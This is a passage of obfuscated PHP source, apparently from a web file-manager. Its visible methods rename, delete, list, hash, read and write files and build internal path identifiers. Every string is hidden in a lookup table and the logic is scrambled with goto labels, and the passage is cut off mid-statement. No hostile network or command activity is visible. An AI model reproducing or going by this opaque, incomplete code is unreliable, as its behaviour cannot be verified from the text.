$this->iconvSystem($bù µ¿‡Àè); $Añ¥Ñó…¥ = intval(@rename($A½‰˜™¨, $bù µ¿‡Àè)); if (!$Añ¥Ñó…¥) { if ($Añ¥Ñó…¥ = intval(@copy_64($A½‰˜™¨, $bù µ¿‡Àè))) { @unlink($A½‰˜™¨); } } return $Añ¥Ñó…¥ ? $this->getPathOuter($bù µ¿‡Àè) : !1; } public function delFile($e‰¹Ãëîñ£) { $e‰¹Ãëîñ£ = $this->iconvSystem($e‰¹Ãëîñ£); if (!@unlink($e‰¹Ãëîñ£)) { @chmod($e‰¹Ãëîñ£, 511); if (!@unlink($e‰¹Ãëîñ£)) { return !1; } } else { return !0; } } public function delFolder($A…¥øù”ê¯) { goto BöŞ¨­ªÄ¤; FåÌ©Îøñ´: if (!($aÄà‹ÅÜ·‰ = opendir($A…¥øù”ê¯))) { return !1; } while (($aéì÷‰Ç² = readdir($aÄà‹ÅÜ·‰)) !== !1) { if ($aéì÷‰Ç² == $f‚·á´À¨¦[94] || $aéì÷‰Ç² == $f‚·á´À¨¦[1225]) { continue; } $aï ¢ù¸« = $A…¥øù”ê¯ . $f‚·á´À¨¦[8] . $aéì÷‰Ç²; if (is_file($aï ¢ù¸«) || is_link($aï ¢ù¸«)) { if (!unlink($aï ¢ù¸«)) { chmod($aï ¢ù¸«, 511); if (!unlink($aï ¢ù¸«)) { return !1; } } } else { if (is_dir($aï ¢ù¸«)) { chmod($aï ¢ù¸«, 511); $aï ¢ù¸« = $this->iconvApp($aï ¢ù¸«); if (!$this->delFolder($aï ¢ù¸«)) { return !1; } } } } closedir($aÄà‹ÅÜ·‰); goto Bêóİ¾÷ô; Bêóİ¾÷ô: return rmdir($A…¥øù”ê¯); goto dé–¨Ù‰”; BöŞ¨­ªÄ¤: $f‚·á´À¨¦ =& $_SERVER[Š‰]; $A…¥øù”ê¯ = $this->iconvSystem($A…¥øù”ê¯); if (!is_dir($A…¥øù”ê¯)) { return !0; } goto FåÌ©Îøñ´; dé–¨Ù‰”: } public function rename($B™‚îò¼ô, $FÁÙŒ™˜•Ç) { goto E¥ö¶‹·‡»; E¥ö¶‹·‡»: $FÄ„˜˜Œ‹” =& $_SERVER[Š‰]; $bëÓˆÅ‰ = $this->fileNameAuto($this->pathFather($B™‚îò¼ô), $FÁÙŒ™˜•Ç); $bëÓˆÅ‰ = $this->iconvSystem($bëÓˆÅ‰); goto a‡¯ŠÖŒàØ; a‡¯ŠÖŒàØ: $B™‚îò¼ô = $this->iconvSystem($B™‚îò¼ô); $aÏÊğí›’ = $this->pathFather($B™‚îò¼ô); $Fæ‘ÇÜÂ…ö = rtrim($aÏÊğí›’, $FÄ„˜˜Œ‹”[8]) . $FÄ„˜˜Œ‹”[8] . $bëÓˆÅ‰; goto FñÚ˜­Œ¸‚; FñÚ˜­Œ¸‚: $e‘™ŒÔñëÀ = @rename($B™‚îò¼ô, $Fæ‘ÇÜÂ…ö); $Fæ‘ÇÜÂ…ö = $this->iconvApp($Fæ‘ÇÜÂ…ö); return $e‘™ŒÔñëÀ ? $this->getPathOuter($Fæ‘ÇÜÂ…ö) : !1; goto e…ÇùƒŞ£Ñ; e…ÇùƒŞ£Ñ: } public function size($BÙ´Á†Â‚) { $BÙ´Á†Â‚ = $this->iconvSystem($BÙ´Á†Â‚); return filesize_64($BÙ´Á†Â‚); } public function info($döîå–µ‰³) { $döîå–µ‰³ = $this->iconvSystem($döîå–µ‰³); if ($this->isFolder($döîå–µ‰³)) { return $this->folderInfo($döîå–µ‰³); } else { if ($this->isFile($döîå–µ‰³)) { return $this->fileInfo($döîå–µ‰³); } } return !1; } protected function infoChildren($eõ´‰ªÂÕ, &$cÙ™Ğ­…ƒ, $EÀÉ‹ååæ = true) { goto AÜÉ„ôØì®; d†Ş‡™“«¤: if ($EÀÉ‹ååæ) { $eõ´‰ªÂÕ = $this->iconvSystem($eõ´‰ªÂÕ); } if (!($AçïåÈ”¨á = @opendir($eõ´‰ªÂÕ))) { return; } while (($Dòª´³ö¯ = readdir($AçïåÈ”¨á)) !== !1) { if ($Dòª´³ö¯ == $C¨Õò®¯[94] || $Dòª´³ö¯ == $C¨Õò®¯[1225]) { continue; } $B¼–ÔŒ’Ö = $eõ´‰ªÂÕ . $Dòª´³ö¯; if (is_file($B¼–ÔŒ’Ö) || is_link($B¼–ÔŒ’Ö)) { $cÙ™Ğ­…ƒ[$C¨Õò®¯[78]]++; $cÙ™Ğ­…ƒ[$C¨Õò®¯[77]] += filesize_64($B¼–ÔŒ’Ö); } else { if (is_dir($B¼–ÔŒ’Ö)) { $cÙ™Ğ­…ƒ[$C¨Õò®¯[79]]++; $this->infoChildren($B¼–ÔŒ’Ö, $cÙ™Ğ­…ƒ, !1); } } } goto aí¯£Ø¼ùğ; aí¯£Ø¼ùğ: closedir($AçïåÈ”¨á); goto CÈØóÇ›¡¯; AÜÉ„ôØì®: $C¨Õò®¯ =& $_SERVER[Š‰]; check_abort_echo(); $eõ´‰ªÂÕ = rtrim($eõ´‰ªÂÕ, $C¨Õò®¯[8]) . $C¨Õò®¯[8]; goto d†Ş‡™“«¤; CÈØóÇ›¡¯: } private function folderInfo($a²½©„Ğ»¼, $D¹éÛ¿­ê‰ = false) { $C²¾ÚÜ–÷‹ =& $_SERVER[Š‰]; $a²½©„Ğ»¼ = rtrim($a²½©„Ğ»¼, $C²¾ÚÜ–÷‹[8]) . $C²¾ÚÜ–÷‹[8]; $DØÜÍÇ‘ƒ¿ = $this->iconvApp($this->pathThis($a²½©„Ğ»¼)); if ($D¹éÛ¿­ê‰) { return array($C²¾ÚÜ–÷‹[28] => $DØÜÍÇ‘ƒ¿, $C²¾ÚÜ–÷‹[75] => $this->getPathOuter($a²½©„Ğ»¼), $C²¾ÚÜ–÷‹[29] => $C²¾ÚÜ–÷‹[76]); } $f”Ìá†Æœ = array($C²¾ÚÜ–÷‹[28] => $DØÜÍÇ‘ƒ¿, $C²¾ÚÜ–÷‹[75] => $this->getPathOuter($a²½©„Ğ»¼), $C²¾ÚÜ–÷‹[29] => $C²¾ÚÜ–÷‹[76], $C²¾ÚÜ–÷‹[192] => @filectime($a²½©„Ğ»¼), $C²¾ÚÜ–÷‹[83] => @filemtime($a²½©„Ğ»¼), $C²¾ÚÜ–÷‹[1228] => @fileatime($a²½©„Ğ»¼), $C²¾ÚÜ–÷‹[1229] => is_readable($a²½©„Ğ»¼), $C²¾ÚÜ–÷‹[1230] => is_writable($a²½©„Ğ»¼), $C²¾ÚÜ–÷‹[1231] => get_mode($a²½©„Ğ»¼)); return $f”Ìá†Æœ; } private function fileInfo($D‚£İ’­ºŠ, $dÑÎì—ñÕ² = false) { $fè‚³ÓŸÓª =& $_SERVER[Š‰]; $b¾„ÇÈÌÔ = $this->iconvApp($this->pathThis($D‚£İ’­ºŠ)); if ($dÑÎì—ñÕ²) { return array($fè‚³ÓŸÓª[28] => $b¾„ÇÈÌÔ, $fè‚³ÓŸÓª[75] => $this->getPathOuter($D‚£İ’­ºŠ), $fè‚³ÓŸÓª[29] => $fè‚³ÓŸÓª[173], $fè‚³ÓŸÓª[77] => $this->size($D‚£İ’­ºŠ), $fè‚³ÓŸÓª[167] => $this->ext($b¾„ÇÈÌÔ)); } $B¤ÆğŠÃÍÜ = array($fè‚³ÓŸÓª[28] => $b¾„ÇÈÌÔ, $fè‚³ÓŸÓª[75] => $this->getPathOuter($D‚£İ’­ºŠ), $fè‚³ÓŸÓª[29] => $fè‚³ÓŸÓª[173], $fè‚³ÓŸÓª[192] => @filectime($D‚£İ’­ºŠ), $fè‚³ÓŸÓª[83] => @filemtime($D‚£İ’­ºŠ), $fè‚³ÓŸÓª[1228] => @fileatime($D‚£İ’­ºŠ), $fè‚³ÓŸÓª[77] => $this->size($D‚£İ’­ºŠ), $fè‚³ÓŸÓª[167] => $this->ext($b¾„ÇÈÌÔ), $fè‚³ÓŸÓª[1229] => is_readable($D‚£İ’­ºŠ), $fè‚³ÓŸÓª[1230] => is_writable($D‚£İ’­ºŠ), $fè‚³ÓŸÓª[1231] => get_mode($D‚£İ’­ºŠ)); return $B¤ÆğŠÃÍÜ; } public function exist($aõ¾öãÄğó) { $aõ¾öãÄğó = $this->iconvSystem($aõ¾öãÄğó); return @file_exists($aõ¾öãÄğó); } public function isFile($dÏ‚’­ìÖÁ) { $dÏ‚’­ìÖÁ = $this->iconvSystem($dÏ‚’­ìÖÁ); return @is_file($dÏ‚’­ìÖÁ); } public function isFolder($B£œÎ©ìŠØ) { $B£œÎ©ìŠØ = $this->iconvSystem($B£œÎ©ìŠØ); return @is_dir($B£œÎ©ìŠØ); } public function listPath($FÁƒÀ‘«ï, $côÌ…‘Ø¾• = false) { goto e±ËÁì»“ˆ; DØÕÃÔ¡: closedir($B×õø©ù©); return $b­´ÁĞËÃ¶; goto dØ¥À‚À†Ú; a¸Ê§’íª: $b­´ÁĞËÃ¶ = array($bÅè‰ÖÂÙ[74] => array(), $bÅè‰ÖÂÙ[73] => array()); if (!($B×õø©ù© = @opendir($FÁƒÀ‘«ï))) { return $b­´ÁĞËÃ¶; } while (($fË…º½·ğÖ = readdir($B×õø©ù©)) !== !1) { if ($fË…º½·ğÖ == $bÅè‰ÖÂÙ[94] || $fË…º½·ğÖ == $bÅè‰ÖÂÙ[1225]) { continue; } $E¢õóé”²Ó = $FÁƒÀ‘«ï . $fË…º½·ğÖ; if (is_file($E¢õóé”²Ó)) { $b­´ÁĞËÃ¶[$bÅè‰ÖÂÙ[73]][] = $this->fileInfo($E¢õóé”²Ó, $côÌ…‘Ø¾•); } else { $b­´ÁĞËÃ¶[$bÅè‰ÖÂÙ[74]][] = $this->folderInfo($E¢õóé”²Ó, $côÌ…‘Ø¾•); } } goto DØÕÃÔ¡; e±ËÁì»“ˆ: $bÅè‰ÖÂÙ =& $_SERVER[Š‰]; $FÁƒÀ‘«ï = $this->iconvSystem($FÁƒÀ‘«ï); $FÁƒÀ‘«ï = rtrim($FÁƒÀ‘«ï, $bÅè‰ÖÂÙ[8]) . $bÅè‰ÖÂÙ[8]; goto a¸Ê§’íª; dØ¥À‚À†Ú: } public function listAll($cöµ«î±, &$D¿…À’Ùîç = array()) { goto a„Ñæ¿Í¦À; C¤Ï¢Áá””: if (!($dÖ°™„‘¯Æ = @opendir($cöµ«î±))) { return $D¿…À’Ùîç; } while (($A¥×²éïÕ = readdir($dÖ°™„‘¯Æ)) !== !1) { if ($A¥×²éïÕ == $f‰ÅÓñ™Ş[94] || $A¥×²éïÕ == $f‰ÅÓñ™Ş[1225]) { continue; } $A¼Õ¿‰†Âš = $cöµ«î± . $A¥×²éïÕ; if (is_dir($A¼Õ¿‰†Âš) && !is_link($A¼Õ¿‰†Âš)) { $D¿…À’Ùîç[] = array($f‰ÅÓñ™Ş[75] => $A¼Õ¿‰†Âš . $f‰ÅÓñ™Ş[8], $f‰ÅÓñ™Ş[76] => 1, $f‰ÅÓñ™Ş[83] => @filemtime($A¼Õ¿‰†Âš), $f‰ÅÓñ™Ş[77] => 0); $this->listAll($A¼Õ¿‰†Âš, $D¿…À’Ùîç); } else { $D¿…À’Ùîç[] = array($f‰ÅÓñ™Ş[75] => $A¼Õ¿‰†Âš, $f‰ÅÓñ™Ş[76] => 0, $f‰ÅÓñ™Ş[83] => @filemtime($A¼Õ¿‰†Âš), $f‰ÅÓñ™Ş[77] => $this->size($A¼Õ¿‰†Âš)); } } closedir($dÖ°™„‘¯Æ); goto e©‘´ĞÓƒ; e©‘´ĞÓƒ: return $D¿…À’Ùîç; goto B¨Œˆ’É±™; a„Ñæ¿Í¦À: $f‰ÅÓñ™Ş =& $_SERVER[Š‰]; $cöµ«î± = $this->iconvSystem($cöµ«î±); $cöµ«î± = rtrim($cöµ«î±, $f‰ÅÓñ™Ş[8]) . $f‰ÅÓñ™Ş[8]; goto C¤Ï¢Áá””; B¨Œˆ’É±™: } public function has($bá§ìå¹±, $dŒœõÑˆÀ = false, $Aº™µºé°ø = true) { goto fç«¦·ÇöÅ; fç«¦·ÇöÅ: $FÏ‘Ü²½ƒŠ =& $_SERVER[Š‰]; $bá§ìå¹± = $this->iconvSystem($bá§ìå¹±); $bá§ìå¹± = rtrim($bá§ìå¹±, $FÏ‘Ü²½ƒŠ[8]) . $FÏ‘Ü²½ƒŠ[8]; goto FÃ¢àôÊ˜Ë; FÃ¢àôÊ˜Ë: if (!($A’êõ¥ÛÖğ = @opendir($bá§ìå¹±))) { return !1; } $dÅæ×¢²°³ = 0; $D½•šÏ»°³ = 0; goto Fî¥ˆˆµ¬İ; Fî¥ˆˆµ¬İ: $c×òªÊœó = 0; while (($AÍËù÷‡Ö« = readdir($A’êõ¥ÛÖğ)) !== !1) { if ($AÍËù÷‡Ö« == $FÏ‘Ü²½ƒŠ[94] || $AÍËù÷‡Ö« == $FÏ‘Ü²½ƒŠ[1225]) { continue; } $f‚ Œ¬óâõ = $bá§ìå¹± . $AÍËù÷‡Ö«; if ($dŒœõÑˆÀ) { $c×òªÊœó++; if (@is_file($f‚ Œ¬óâõ)) { $dÅæ×¢²°³++; } else { $D½•šÏ»°³++; } if ($c×òªÊœó > 10000) { break; } continue; } if ($Aº™µºé°ø) { if (@is_file($f‚ Œ¬óâõ)) { return !0; } } else { if (@is_dir($f‚ Œ¬óâõ . $FÏ‘Ü²½ƒŠ[8])) { return !0; } } } closedir($A’êõ¥ÛÖğ); goto AŒÙƒÒ±Âœ; AŒÙƒÒ±Âœ: if ($dŒœõÑˆÀ) { return array($FÏ‘Ü²½ƒŠ[201] => $dÅæ×¢²°³, $FÏ‘Ü²½ƒŠ[202] => $D½•šÏ»°³); } return !1; goto eËòô‡ˆó; eËòô‡ˆó: } public function hashSimple($c¯°ŸÉ’¢) { goto dë‡ß´ÊÖ; F§…¬‰åÃá: if ($dëÀ„½œº„ <= $d£Ø¿¢ˆğó * $C‚¯ÁÅï‘Ú) { return $this->hashMd5($c¯°ŸÉ’¢) . $dëÀ„½œº„; } $AèÅèŸÅ·‰ = $EÉ¹î¾ÏßÂ[33]; $Cˆİ¸¦Û«Ú = intval($dëÀ„½œº„ / $C‚¯ÁÅï‘Ú); goto dì‡‘Ù¸ÙÀ; dì‡‘Ù¸ÙÀ: $aÚÜğ§ŞŞ° = fopen($c¯°ŸÉ’¢, $EÉ¹î¾ÏßÂ[1232]); if (!$aÚÜğ§ŞŞ°) { return $AèÅèŸÅ·‰; } for ($e¼ãéã¸Ç = 0; $e¼ãéã¸Ç < $C‚¯ÁÅï‘Ú; $e¼ãéã¸Ç++) { fseek_64($aÚÜğ§ŞŞ°, $Cˆİ¸¦Û«Ú * $e¼ãéã¸Ç); $AèÅèŸÅ·‰ .= fread($aÚÜğ§ŞŞ°, $d£Ø¿¢ˆğó); } goto DÉ»¼ŒÜ½›; a°Äºó†¬: return md5($AèÅèŸÅ·‰) . $dëÀ„½œº„; goto Bù‡åó±¬; DÉ»¼ŒÜ½›: fseek_64($aÚÜğ§ŞŞ°, $dëÀ„½œº„ - $d£Ø¿¢ˆğó); $AèÅèŸÅ·‰ .= fread($aÚÜğ§ŞŞ°, $d£Ø¿¢ˆğó); fclose($aÚÜğ§ŞŞ°); goto a°Äºó†¬; dë‡ß´ÊÖ: $EÉ¹î¾ÏßÂ =& $_SERVER[Š‰]; if (!$c¯°ŸÉ’¢) { return md5($EÉ¹î¾ÏßÂ[33]); } $c¯°ŸÉ’¢ = $this->iconvSystem($c¯°ŸÉ’¢); goto dº©Š„¸¢ï; dº©Š„¸¢ï: $dëÀ„½œº„ = $this->size($c¯°ŸÉ’¢); $d£Ø¿¢ˆğó = 200; $C‚¯ÁÅï‘Ú = 50; goto F§…¬‰åÃá; Bù‡åó±¬: } public function getContent($b¤†‘¯®§) { $b¤†‘¯®§ = $this->iconvSystem($b¤†‘¯®§); return file_get_contents($b¤†‘¯®§); } public function setContent($dø¶¯ÑÚ¤˜, $b„½¸Í¤ÑŞ = '') { $dø¶¯ÑÚ¤˜ = $this->iconvSystem($dø¶¯ÑÚ¤˜); $aŸ½³Ş†«‘ = @file_put_contents($dø¶¯ÑÚ¤˜, $b„½¸Í¤ÑŞ, LOCK_EX); clearstatcache(); return $aŸ½³Ş†«‘ === !1 ? !1 : !0; } public function fileSubstr($F³½Í•ïÉ, $dª­ÒÇì‘í = 0, $Eä…Üá–¤– = false) { goto b¥•ÅíÀ¼; b¥•ÅíÀ¼: $Aß’Šï„·ç =& $_SERVER[Š‰]; $F³½Í•ïÉ = $this->iconvSystem($F³½Í•ïÉ); if ($Eä…Üá–¤– === !1) { $Eä…Üá–¤– = $this->size($F³½Í•ïÉ); } goto B’ ÆÑ˜êí; c‘Æ‚¥œæ¾: fseek_64($f±ÑÊ¤¢šà, $dª­ÒÇì‘í); $aÄÜœ¢’ç = fread($f±ÑÊ¤¢šà, $Eä…Üá–¤–); fclose($f±ÑÊ¤¢šà); goto F¶Æœ˜²¿—; F¶Æœ˜²¿—: return $aÄÜœ¢’ç; goto Fä¢ÍŒ·ßé; B’ ÆÑ˜êí: if ($Eä…Üá–¤– <= 0) { return $Aß’Šï„·ç[33]; } $f±ÑÊ¤¢šà = fopen($F³½Í•ïÉ, $Aß’Šï„·ç[1232]); if (!$f±ÑÊ¤¢šà) { return !1; } goto c‘Æ‚¥œæ¾; Fä¢ÍŒ·ßé: } public function upload($fäŞñ ´‚¨, $bœğ«ê ñ©, $d¡¦ÅèàïŸ = false, $E«Ó‹¤ïå” = REPEAT_REPLACE) { $AÁ ¡á‡”æ = $this->copyFile($bœğ«ê ñ©, $fäŞñ ´‚¨); return $AÁ ¡á‡”æ ? $this->getPathOuter($fäŞñ ´‚¨) : !1; } public function setModifyTime($D¯ÙçòÀ¬š, $f½‡š¢Åˆ = '') { @touch($D¯ÙçòÀ¬š, intval($f½‡š¢Åˆ)); } public function download($cè¤ö°…Ú, $bö±¢ÇòÙÚ) { return $this->iconvSystem($cè¤ö°…Ú); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($e´ßãÔíó¬) { parent::__construct($e´ßãÔíó¬); $this->signatureVersion($_SERVER[Š‰][210]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($dÔ˜™‹Ö) { parent::__construct($dÔ˜™‹Ö); $this->signatureVersion($_SERVER[Š‰][210]); } public function fileOutLink($AÒÔ¿Í§Ğ) { $Dˆ±ÑÎºÄ¯ =& $_SERVER[Š‰]; if (substr($AÒÔ¿Í§Ğ, 0, 7) == $Dˆ±ÑÎºÄ¯[1178]) { $AÒÔ¿Í§Ğ = $Dˆ±ÑÎºÄ¯[1179] . substr($AÒÔ¿Í§Ğ, 7); } header($Dˆ±ÑÎºÄ¯[158] . $AÒÔ¿Í§Ğ); die; } } goto C‡¾À¿¾ç; b•ŒÓØÈ: class KodIO { const KOD_SOURCE = "\x7b\163\157\165\162\143\x65\175"; const KOD_USER_RECYCLE = "\173\x75\x73\x65\162\x52\x65\143\x79\143\x6c\x65\x7d"; const KOD_USER_FAV = "\173\x75\x73\145\162\x46\x61\x76\x7d"; const KOD_USER_FILE_TAG = "\173\165\163\145\162\x46\151\x6c\x65\124\141\147\175"; const KOD_USER_FILE_TYPE = "\173\x75\x73\x65\x72\106\x69\154\145\124\x79\160\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\162\157\x75\160\x52\x6f\157\x74\123\x65\154\x66\x7d"; const KOD_USER_SHARE = "\173\x75\163\x65\162\123\150\x61\x72\x65\x7d"; const KOD_USER_SHARE_LINK = "\173\165\163\145\x72\x53\150\x61\x72\x65\x4c\x69\x6e\x6b\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\x68\x61\x72\x65\x54\x6f\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\x68\x61\162\x65\x49\x74\x65\155\175"; const KOD_SHARE_LINK = "\x7b\x73\x68\x61\x72\145\111\164\x65\x6d\114\151\x6e\153\175"; const KOD_SEARCH = "\x7b\163\145\x61\162\143\x68\x7d"; const KOD_BLOCK = "\x7b\x62\154\157\x63\153\x7d"; const KOD_IO = "\173\151\x6f\x7d"; const KOD_USER_RECENT = "\173\x75\163\x65\x72\122\x65\156\x63\x65\x6e\164\175"; const KOD_USER_DRIVER = "\x7b\144\162\151\166\x65\x72\175"; public static function typeList() { $dô¸†á—¡ =& $_SERVER[Š‰]; return array($dô¸†á—¡[1114] => self::KOD_SOURCE, $dô¸†á—¡[1115] => self::KOD_USER_RECYCLE, $dô¸†á—¡[1116] => self::KOD_USER_FAV, $dô¸†á—¡[1117] => self::KOD_USER_FILE_TAG, $dô¸†á—¡[1118] => self::KOD_USER_FILE_TYPE, $dô¸†á—¡[1119] => self::KOD_GROUP_ROOT_SELF, $dô¸†á—¡[1120] => self::KOD_USER_SHARE, $dô¸†á—¡[1121] => self::KOD_USER_SHARE_LINK, $dô¸†á—¡[1122] => self::KOD_USER_SHARE_TO_ME, $dô¸†á—¡[1123] => self::KOD_SHARE_ITEM, $dô¸†á—¡[1124] => self::KOD_SHARE_LINK, $dô¸†á—¡[1125] => self::KOD_SEARCH, $dô¸†á—¡[1126] => self::KOD_BLOCK, $dô¸†á—¡[1127] => self::KOD_IO, $dô¸†á—¡[1128] => self::KOD_USER_RECENT, $dô¸†á—¡[1129] => self::KOD_USER_DRIVER); } public static function parse($bë÷ÅÙ”«¾) { goto CÛ­–‹—³§; EíàĞ‰¼É÷: preg_match($Côòò˜ù¿Ó[1130], $bë÷ÅÙ”«¾, $bÀ…ëºÄöß); $D†œå˜ñò = array($Côòò˜ù¿Ó[409] => !1, $Côòò˜ù¿Ó[1131] => !1, $Côòò˜ù¿Ó[406] => !1, $Côòò˜ù¿Ó[75] => $bë÷ÅÙ”«¾, $Côòò˜ù¿Ó[1041] => !1, $Côòò˜ù¿Ó[1040] => $Côòò˜ù¿Ó[33]); if (is_array($bÀ…ëºÄöß) && count($bÀ…ëºÄöß) == 5) { $Bù‹¬³ù°— = $Côòò˜ù¿Ó[1132] . $bÀ…ëºÄöß[2] . $Côòò˜ù¿Ó[323]; if (in_array($Bù‹¬³ù°—, $C•ˆó£’ÃÑ)) { $D†œå˜ñò[$Côòò˜ù¿Ó[1041]] = $bÀ…ëºÄöß[1]; $D†œå˜ñò[$Côòò˜ù¿Ó[29]] = $Bù‹¬³ù°—; $D†œå˜ñò[$Côòò˜ù¿Ó[1133]] = substr($Bù‹¬³ù°—, 1, -1); $D†œå˜ñò[$Côòò˜ù¿Ó[388]] = $bÀ…ëºÄöß[3]; } $D†œå˜ñò[$Côòò˜ù¿Ó[1040]] = $bÀ…ëºÄöß[4]; } goto A¬Çö¡‡˜¥; CÛ­–‹—³§: $Côòò˜ù¿Ó =& $_SERVER[Š‰]; $bë÷ÅÙ”«¾ = self::clear($bë÷ÅÙ”«¾); $C•ˆó£’ÃÑ = array_values(self::typeList()); goto EíàĞ‰¼É÷; A¬Çö¡‡˜¥: $C‘ªâöò—Í = array($Côòò˜ù¿Ó[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $D†œå˜ñò[$Côòò˜ù¿Ó[1095]] = in_array($D†œå˜ñò[$Côòò˜ù¿Ó[29]], $C‘ªâöò—Í); return $D†œå˜ñò; goto DÁˆ”´¾ÍŸ; DÁˆ”´¾ÍŸ: } public static function isTruePath($aµ¶¢¸¿š) { goto b¤´Û—’¹â; b¤´Û—’¹â: $aÀÓ×¼†ª =& $_SERVER[Š‰]; if (substr($aµ¶¢¸¿š, 0, 1) != $aÀÓ×¼†ª[1132]) { return !0; } if (strpos($aµ¶¢¸¿š, $aÀÓ×¼†ª[395]) === 0) { return !0; } goto BÛÃİ‹Û ù; fÁà§í‰‹É: if (strpos($aµ¶¢¸¿š, $aÀÓ×¼†ª[1135]) === 0) { return !0; } return !1; goto bŒá¼¥Ş„; BÛÃİ‹Û ù: if (strpos($aµ¶¢¸¿š, $aÀÓ×¼†ª[1098]) === 0) { return !0; } if (strpos($aµ¶¢¸¿š, $aÀÓ×¼†ª[1134]) === 0) { return !0; } if (strpos($aµ¶¢¸¿š, $aÀÓ×¼†ª[1134]) === 0) { return !0; } goto fÁà§í‰‹É; bŒá¼¥Ş„: } public static function clear($F“›î¸ÁÈ³) { goto c¹¬Àª½äØ; c¹¬Àª½äØ: $B÷¥–›Î‘Ô =& $_SERVER[Š‰]; $F“›î¸ÁÈ³ = str_replace(array($B÷¥–›Î‘Ô[1014], $B÷¥–›Î‘Ô[227]), $B÷¥–›Î‘Ô[50], $F“›î¸ÁÈ³); $F“›î¸ÁÈ³ = str_replace($B÷¥–›Î‘Ô[96], $B÷¥–›Î‘Ô[8], $F“›î¸ÁÈ³); goto A‘÷„ó™³; FµŞÛ×Ï¼: return $F“›î¸ÁÈ³; goto Aƒ˜ô°è„®; f„ƒ–¼…Æ÷: $F“›î¸ÁÈ³ = preg_replace($B÷¥–›Î‘Ô[1138], $B÷¥–›Î‘Ô[8], $F“›î¸ÁÈ³); if ($F“›î¸ÁÈ³ == $B÷¥–›Î‘Ô[8]) { return $B÷¥–›Î‘Ô[8]; } $F“›î¸ÁÈ³ = rtrim($F“›î¸ÁÈ³, $B÷¥–›Î‘Ô[8]); goto FµŞÛ×Ï¼; A‘÷„ó™³: $BíÊÓÉ´Ö— = $B÷¥–›Î‘Ô[1136]; if (substr($F“›î¸ÁÈ³, 0, 3) == $B÷¥–›Î‘Ô[1137]) { $F“›î¸ÁÈ³ = substr($F“›î¸ÁÈ³, 3); } while (strstr($F“›î¸ÁÈ³, $BíÊÓÉ´Ö—)) { $F“›î¸ÁÈ³ = str_replace($BíÊÓÉ´Ö—, $B÷¥–›Î‘Ô[8], $F“›î¸ÁÈ³); } goto f„ƒ–¼…Æ÷; Aƒ˜ô°è„®: } public static function sourceID($eˆç–¬¡Ñ¼) { $AÈàÆ·èÇà =& $_SERVER[Š‰]; $f³‘ºçŠ = self::parse($eˆç–¬¡Ñ¼); if ($f³‘ºçŠ[$AÈàÆ·èÇà[29]] !== self::KOD_SOURCE) { show_json(LNG($AÈàÆ·èÇà[1139]), !1); } return $f³‘ºçŠ[$AÈàÆ·èÇà[388]]; } public static function make($EãÀ›Ÿ¦“) { if (!$EãÀ›Ÿ¦“) { return !1; } return self::makePath(self::KOD_SOURCE, intval($EãÀ›Ÿ¦“)); } public static function makeShare($e‚‘ÚË†§…, $CƒÀ–Ì•) { return self::makePath(self::KOD_SHARE_ITEM, $e‚‘ÚË†§…, $CƒÀ–Ì•); } public static function makeFileTypePath($AÚÖÃŠÜ›é) { return self::makePath(self::KOD_USER_FILE_TYPE, $AÚÖÃŠÜ›é); } public static function makeFileTagPath($c”¤Ú¸ä•¡) { return self::makePath(self::KOD_USER_FILE_TAG, $c”¤Ú¸ä•¡); } public static function makePath($F¬†Ø‰¸Ó¨, $d¦†¢â¯¨à = '', $DĞ¾Ş·Í‹ = '') { $dã£óŞËÊ =& $_SERVER[Š‰]; $fğöÉ¬Ì– = substr($F¬†Ø‰¸Ó¨, 1, -1); $cê™¨ñ­àœ = $dã£óŞËÊ[1140] . $fğöÉ¬Ì– . $dã£óŞËÊ[1141] . $d¦†¢â¯¨à . $dã£óŞËÊ[1142]; $cê™¨ñ­àœ = $DĞ¾Ş·Í‹ ? $cê™¨ñ­àœ . $DĞ¾Ş·Í‹ . $dã£óŞËÊ[8] : $cê™¨ñ­àœ; return $cê™¨ñ­àœ; } public static function hashPath($F¯¥¸º†ó) { $C’ïÀİÓä =& $_SERVER[Š‰]; $FÑ­‚¦éÉ = is_array($F¯¥¸º†ó) ? $F¯¥¸º†ó : IO::info($F¯¥¸º†ó); $AÉªÀ½Ğ°¦ = _get($FÑ­‚¦éÉ, $C’ïÀİÓä[1143], $C’ïÀİÓä[33]); if (!$AÉªÀ½Ğ°¦) { $D‰”‘î„³© = KodIO::parse($FÑ­‚¦éÉ[$C’ïÀİÓä[75]]); if (!$D‰”‘î„³©[$C’ïÀİÓä[29]]) { $AÉªÀ½Ğ°¦ = IO::hashSimple($FÑ­‚¦éÉ[$C’ïÀİÓä[75]]); } } if (!$AÉªÀ½Ğ°¦) { $AÉªÀ½Ğ°¦ = md5($FÑ­‚¦éÉ[$C’ïÀİÓä[75]] . $FÑ­‚¦éÉ[$C’ïÀİÓä[77]] . $FÑ­‚¦éÉ[$C’ïÀİÓä[83]]); } return $AÉªÀ½Ğ°¦; } public static function initSystemPath() { goto DƒíñÚøÇÂ; DƒíñÚøÇÂ: $aÔÉÖ„¼° =& $_SERVER[Š‰]; if (defined($aÔÉÖ„¼°[1144])) { return; } define($aÔÉÖ„¼°[1144], self::systemPath($aÔÉÖ„¼°[1145])); goto C†”–Œ¾ï; C†”–Œ¾ï: define($aÔÉÖ„¼°[1146], self::systemPath($aÔÉÖ„¼°[1147])); define($aÔÉÖ„¼°[1148], self::systemPath($aÔÉÖ„¼°[1149])); define($aÔÉÖ„¼°[1150], self::systemPath($aÔÉÖ„¼°[1151])); goto dŞƒ¹Õ±ä; dŞƒ¹Õ±ä: IOHistory::bindEvent(); goto fõÉ‚‡ŠŞÛ; fõÉ‚‡ŠŞÛ: } public static function systemPath($EÓ—Ù³™ó) { goto FŞ÷·‹‹óÚ; e±ÖÃ„—†»: if ($CäÜä®§Æ÷) { return $CäÜä®§Æ÷; } if ($EÓ—Ù³™ó == $EòÓÄÚ‚‚[1145]) { $CäÜä®§Æ÷ = self::make(Model($EòÓÄÚ‚‚[775])->systemRootPathAdd($EòÓÄÚ‚‚[500])); } else { $CäÜä®§Æ÷ = self::systemPath($EòÓÄÚ‚‚[1145]); $a¤Ê »œí‘ = 